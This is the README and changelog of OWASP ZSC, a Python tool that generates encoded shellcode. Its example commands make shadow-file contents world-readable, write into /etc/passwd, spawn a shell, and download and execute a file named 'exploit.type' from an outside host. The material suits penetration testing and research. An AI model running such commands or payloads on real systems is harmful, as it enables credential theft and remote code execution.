OWASP ZSC
=========

OWASP ZCR Shellcoder is an open source software in python language which lets you 
generate customized  shellcodes for listed operation systems. This software 
can be run on Windows/Linux&Unix/OSX and others OS under python 2.7.x.

 * OWASP Page: https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
 * Home: http://zsc.z3r0d4y.com/
 * Features: http://zsc.z3r0d4y.com/table.html
 * Github: https://github.com/Ali-Razmjoo/OWASP-ZSC
 * Archive: https://github.com/Ali-Razmjoo/ZCR-Shellcoder-Archive
 * About Author: http://www.z3r0d4y.com/p/about.html

![screenshot](http://zsc.z3r0d4y.com/images/Snapshot_2015-07-26_191951.png)

For more information read the document files in main directory or visit home page.


Usages And Examples
-------------------

python shellcoder.py -h
-----------------------

 * -h, --h, -help, --help => to see this help guide
 * -os => choose your os to create shellcode
 * -oslist => list os for switch -os
 * -o => output filename
 * -job => what shellcode gonna do for you ?
 * -joblist => list of -job switch
 * -encode => generate shellcode with encode
 * -types => types of encode for -encode switch
 * -update => check for update

python shellcoder.py -oslist
----------------------------

 * [+] linux_x86
 * [+] linux_x64
 * [+] linux_arm
 * [+] linux_mips
 * [+] freebsd_x86
 * [+] freebsd_x64
 * [+] windows_x86
 * [+] windows_x64
 * [+] osx
 * [+] solaris_x86
 * [+] solaris_x64


python shellcoder.py -joblist
-----------------------------

 * [+] exec('/path/file')
 * [+] chmod('/path/file','permission number')
 * [+] write('/path/file','text to write')
 * [+] file_create('/path/file','text to write')
 * [+] dir_create('/path/folder')
 * [+] download('url','filename')
 * [+] download_execute('url','filename','command to execute')
 * [+] system('command to execute')
 * [+] script_executor('name of script','path and name of your script in your pc','execute command')

python shellcoder.py -types
---------------------------

 * [+] none
 * [+] xor_random
 * [+] xor_yourvalue
 * [+] add_random
 * [+] add_yourvalue
 * [+] sub_random
 * [+] sub_yourvalue
 * [+] inc
 * [+] inc_timesyouwant
 * [+] dec
 * [+] dec_timesyouwant
 * [+] mix_all

 
Generating shellcodes , using functions
----------------------------------------

`python shellcoder.py -os linux_x86 -encode none -job "chmod('/etc/shadow','777')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode xor_random -job "write('/etc/passwd','user:pass')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job "exec('/bin/bash')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode sub_0x4f442c4d -job "system('ls')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode inc -job "system('ls[space]-la')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode dec_10 -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode add_random -job "file_create('/root/Desktop/hello.txt','hello')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode dec_2 -job "file_create('/root/Desktop/hello2.txt','hello[space]world[space]!')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode mix_all -job "dir_create('/root/Desktop/mydirectory')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode add_0x457f9f3d -job "download('http://www.z3r0d4y.com/exploit.type','myfile.type')" -o file.txt`

`python shellcoder.py -os linux_x86 -encode mix_all -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type')" -o file.txt`

Note: exec() doesn't support any ARGV same as `exec('/bin/bash -c ls')` or `exec('/bin/bash','-c','ls')`, you have to use `system()` function.

Note: Remember don't use `" "` and replace it with `"[space]"`


Changes
-------
version 1.0.7.1: FT
-------------------
 * Optimized Core and Removed some required softwares
 * Compatible with OSX [tested on: OS X Tosemite 10.10.4] and Fixed Linux base bugs [tested on: Debian 7.8,Centos 6.7,OpenSUSE 13.2]
 * fixed some encoding modules



version 1.0.7: FT
-----------------


 * add xor_yourvalue encoding in exec() [linux_x86]
 * add add_yourvalue encoding in exec() [linux_x86]
 * add sub_yourvalue encoding in exec() [linux_x86]
 * add inc encoding in exec() [linux_x86]
 * add inc_timesyouwant encoding in exec() [linux_x86]
 * add dec encoding in exec() [linux_x86]
 * add dec_timesyouwant encoding in exec() [linux_x86]
 * add mic_all encoding in exec() [linux_x86]
 * add xor_yourvalue encoding in write() [linux_x86] 
 * add add_yourvalue encoding in write() [linux_x86] 
 * add sub_yourvalue encoding in write() [linux_x86]
 * add inc encoding in write() [linux_x86]
 * add inc_timesyouwant encoding in write() [linux_x86]
 * add dec encoding in write() [linux_x86]
 * add dec_timesyouwant encoding in write() [linux_x86]
 * add mic_all encoding in write() [linux_x86]
 * fixed xor_random encoding in write() [linux_x86]
 * fixed add_random encoding in write() [linux_x86]
 * fixed sub_random encoding in write() [linux_x86]
 * fixed dec_timesyouwant encoding in file_create() [linux_x86]
 * fixed dec_timesyouwant encoding in dir_create() [linux_x86]
 * fixed dec_timesyouwant encoding in download() [linux_x86]
 * fixed dec_timesyouwant encoding in download_execute() [linux_x86]
 * fixed dec_timesyouwant encoding in script_executor() [linux_x86]
 * Optimized software engine and shellcode generators


version 1.0.6: B2018
--------------------


 * add mix_all encoding in chmod() [linux_x86]
 * add xor_random encoding in system() [linux_x86]
 * add xor_yourvalue encoding in system() [linux_x86]
 * add add_random encoding in system() [linux_x86]
 * add add_yourvalue encoding in system() [linux_x86]
 * add sub_random encoding in system() [linux_x86
 * add sub_yourvalue encoding in system() [linux_x86]
 * add inc encoding in system() [linux_x86]
 * add inc_timesyouwant encoding in system() [linux_x86
 * add dec encoding in system() [linux_x86]
 * add dec_timesyouwant encoding in system() [linux_x86]
 * add mix_all encoding in system() [linux_x86]
 * add xor_random encoding in file_create() [linux_x86]
 * add xor_yourvalue encoding in file_create() [linux_x86]
 * add add_random encoding in file_create() [linux_x86]
 * add add_yourvalue encoding in file_create() [linux_x86]
 * add sub_random encoding in file_create() [linux_x86
 * add sub_yourvalue encoding in file_create() [linux_x86]
 * add inc encoding in file_create() [linux_x86]
 * add inc_timesyouwant encoding in file_create() [linux_x86
 * add dec encoding in file_create() [linux_x86]
 * add dec_timesyouwant encoding in file_create() [linux_x86]
 * add mix_all encoding in file_create() [linux_x86]
 * add xor_random encoding in dir_create() [linux_x86]
 * add xor_yourvalue encoding in dir_create() [linux_x86]
 * add add_random encoding in dir_create() [linux_x86]
 * add add_yourvalue encoding in dir_create() [linux_x86]
 * add sub_random encoding in dir_create() [linux_x86
 * add sub_yourvalue encoding in dir_create() [linux_x86]
 * add inc encoding in dir_create() [linux_x86]
 * add inc_timesyouwant encoding in dir_create() [linux_x86
 * add dec encoding in dir_create() [linux_x86]
 * add dec_timesyouwant encoding in dir_create() [linux_x86]
 * add mix_all encoding in dir_create() [linux_x86]
 * add xor_random encoding in download() [linux_x86]
 * add xor_yourvalue encoding in download() [linux_x86]
 * add add_random encoding in download() [linux_x86]
 * add add_yourvalue encoding in download() [linux_x86]
 * add sub_random encoding in download() [linux_x86
 * add sub_yourvalue encoding in download() [linux_x86]
 * add inc encoding in download() [linux_x86]
 * add inc_timesyouwant encoding in download() [linux_x86
 * add dec encoding in download() [linux_x86]
 * add dec_timesyouwant encoding in download() [linux_x86]
 * add mix_all encoding in download() [linux_x86]
 * add xor_random encoding in download_execute() [linux_x86]
 * add xor_yourvalue encoding in download_execute() [linux_x86]
 * add add_random encoding in download_execute() [linux_x86]
 * add add_yourvalue encoding in download_execute() [linux_x86]
 * add sub_random encoding in download_execute() [linux_x86
 * add sub_yourvalue encoding in download_execute() [linux_x86]
 * add inc encoding in download_execute() [linux_x86]
 * add inc_timesyouwant encoding in download_execute() [linux_x86
 * add dec encoding in download_execute() [linux_x86]
 * add dec_timesyouwant encoding in download_execute() [linux_x86]
 * add mix_all encoding in download_execute() [linux_x86]
 * add xor_random encoding in system() [linux_x86]
 * add xor_yourvalue encoding in system() [linux_x86]
 * add add_random encoding in system() [linux_x86]
 * add add_yourvalue encoding in system() [linux_x86]
 * add sub_random encoding in system() [linux_x86
 * add sub_yourvalue encoding in system() [linux_x86]
 * add inc encoding in system() [linux_x86]
 * add inc_timesyouwant encoding in system() [linux_x86
 * add dec encoding in system() [linux_x86]
 * add dec_timesyouwant encoding in system() [linux_x86]
 * add mix_all encoding in system() [linux_x86]
 * add xor_random encoding in script_executor() [linux_x86]
 * add xor_yourvalue encoding in script_executor() [linux_x86]
 * add add_random encoding in script_executor() [linux_x86]
 * add add_yourvalue encoding in script_executor() [linux_x86]
 * add sub_random encoding in script_executor() [linux_x86
 * add sub_yourvalue encoding in script_executor() [linux_x86]
 * add inc encoding in script_executor() [linux_x86]
 * add inc_timesyouwant encoding in script_executor() [linux_x86
 * add dec encoding in script_executor() [linux_x86]
 * add dec_timesyouwant encoding in script_executor() [linux_x86]
 * add mix_all encoding in script_executor() [linux_x86]
 * add add_random encoding in write() [linux_x86]
 * add xor_random encoding in write() [linux_x86]
 * add sub_random encoding in write() [linux_x86]
 * add xor_random encoding in exec() [linux_x86]
 * add sub_random encoding in exec() [linux_x86
 * add add_random encoding in exec() [linux_x86]
 * fixed bug in system() when len(command) is less than 5
 * fixed bug in encode module add_random chmod() [linux_x86]



version 1.0.5.2: S
------------------
 * Project name changed To OWASP ZSC + Signature
 * installing directory changed to /usr/share/owasp_zsc

version 1.0.5.1: CaMo
---------------------
 * upgrade "-wizard" switch
 * add length calculator for output
 * add filename writer in gcc commandline in output file
 * fixed bug in encoding module not available.
 * fixed bug in os module not available

version 1.0.5: CaMo
-------------------
 * add "-wizard" switch
 * add installer "use 'zsc' commandline in terminal after installed"
 * add uninstaller 
 * This Software just could be run on linux since this version
 * change output to .c file and automated shellcode generating
 * add color output for terminal
 * etc ...

version 1.0.4.1: Infinity
-------------------------
 * bug fix reported by user in executing on linux , color function

version 1.0.4: Infinity
-----------------------
 * add inc encoding chmod() [linux_x86]
 * add inc_timesyouwant chmod() [linux_x86]
 * add dec encoding chmod() [linux_x86]
 * add dec_timesyouwant chmod() [linux_x86]
 * add features table inside "features_table.html"
 * add -about to menu for developers name and etc
 * add color output for windows cmd
 * fixed permission number calculating in chmod() [linux_x86]
 * software's signature changes

version 1.0.3: AWAKE
--------------------
 * add xor_random encoding chmod() [linux_x86]
 * add xor_yourvalue encoding chmod() [linux_x86]
 * add add_random encoding chmod() [linux_x86]
 * add add_yourvalue encoding chmod() [linux_x86]
 * add sub_random encoding chmod() [linux_x86]
 * add sub_yourvalue encoding chmod() [linux_x86]
 * fixed shellcode encode type checking

version 1.0.2: SKIP
-------------------
 * [linux_x86 modules completed]
 * add script_executor() [linux - using command execution]
 * add download_execute() [linux_x86 - using command execution (wget)]  
 * add download() [linux_x86 - using command execution (wget)] 
 * add dir_create() [linux_x86 using command execution] 
 * add file_create() [linux_x86 using command execution]
 * add encodes file for next version released

version 1.0.1: BOILING_POINT
----------------------------
 * add system() [linux_x86 command execute]
 * fixed chmod filename 1/4 char length [linux_x86]
 * fixed exec filename 1/4 char length [linux_x86]
 * fixed write filename 1/4 length [linux_x86]
 * fixed write content 1/4 length [linux_x86]
 * fixed write length calculator [linux_x86]
 * and fixed some other bugs in coding [core]

version 1.0.0: ASIIN_BLUE_RUBY
------------------------------

 * add chmod() [linux_x86] -> chmod('/path/file','perm_num')
 * add write() [linux_x86] -> write('/path/file','content')
 * add exec() [linux_x86]  -> exec('/path/file')
 * add encode [none - all os] 



